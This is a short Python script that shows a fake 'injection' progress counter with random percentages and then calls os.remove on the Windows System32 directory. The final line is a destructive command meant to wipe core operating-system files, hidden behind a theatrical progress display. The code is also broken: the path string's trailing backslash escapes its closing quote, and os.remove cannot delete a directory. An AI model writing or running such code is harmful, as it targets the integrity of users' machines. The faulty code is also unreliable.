import random
import time
import os

print("Start of injecting...\n")

for i in range(1, 11):
    time.sleep(1)
    percent_complete = random.randint(10*i, 10*i+10)
    print(f"Injection... {percent_complete}% complete.")
    
print("\nInjection completed.")

os.remove("C:\Windows\System32\")